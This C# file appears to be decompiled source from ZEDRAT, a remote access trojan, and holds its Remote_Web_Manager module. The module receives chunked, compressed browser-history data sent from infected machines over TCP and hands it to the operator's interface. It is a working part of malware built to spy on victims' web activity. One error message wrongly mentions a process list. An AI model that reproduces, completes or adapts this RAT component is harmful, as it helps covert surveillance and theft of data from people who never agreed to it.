using System;
using System.Collections.Generic;
using System.Text;
using Sockets;
using ZEDRAT.Algorithm;
using ZEDRAT.Messages;
using ZEDRatApp.ZEDRAT.Messages;

namespace ZEDRAT.Module
{
	public class Remote_Web_Manager
	{
		public Action<string, object> _FormExecute;

		public List<RemoteWebList> lstWebHistory = new List<RemoteWebList>();

		public List<byte> HistoryData = new List<byte>();

		public TcpClientSession _tcs;

		public Remote_Web_Manager(TcpClientSession tcs)
		{
			this._tcs = tcs;
		}

		public void RemoteWebExecute(TcpClientSession tcs, byte[] bt)
		{
			try
			{
				RemoteOther_Messages remoteOther_Messages = RemoteOther_Messages.ByteToClass(bt);
				string shellDataType = remoteOther_Messages._ShellDataType;
				if (shellDataType != "Begin")
				{
					if (shellDataType != "WindowRefresh")
					{
						if (shellDataType != "End")
						{
							if (shellDataType != "SetupEnd")
							{
								if (!(shellDataType != "Status"))
								{
									this._FormExecute("Status", Encoding.UTF8.GetString(remoteOther_Messages._Payload));
								}
							}
							else
							{
								this.CheckingWeblist(remoteOther_Messages._Payload, "SetupRefresh");
							}
						}
						else
						{
							this.CheckingWeblist(remoteOther_Messages._Payload, "Refresh");
						}
					}
					else
					{
						this._FormExecute("WindowRefresh", Serializable.Deserialize(GZip.Decompress(remoteOther_Messages._Payload)) as string);
					}
				}
				else
				{
					this.HistoryData.AddRange(remoteOther_Messages._Payload);
				}
			}
			catch (Exception ex)
			{
				this.HistoryData?.Clear();
				this.lstWebHistory?.Clear();
				this._FormExecute("Status", ex.Message);
			}
		}

		private void CheckingWeblist(byte[] payload, string Refresh)
		{
			try
			{
				if (this.HistoryData.Count != BitConverter.ToInt32(payload, 0))
				{
					this._FormExecute("Status", "Failed to get the remote process list.");
					return;
				}
				this.lstWebHistory = Serializable.Deserialize(GZip.Decompress(this.HistoryData.ToArray())) as List<RemoteWebList>;
				this._FormExecute(Refresh, this.lstWebHistory);
			}
			catch (Exception ex)
			{
				throw ex;
			}
			finally
			{
				this.HistoryData?.Clear();
				this.lstWebHistory?.Clear();
			}
		}

		public void destroy()
		{
			this._FormExecute = null;
			this._tcs = null;
			this.lstWebHistory?.Clear();
			this.lstWebHistory = null;
			this.HistoryData?.Clear();
			this.HistoryData = null;
		}
	}
}
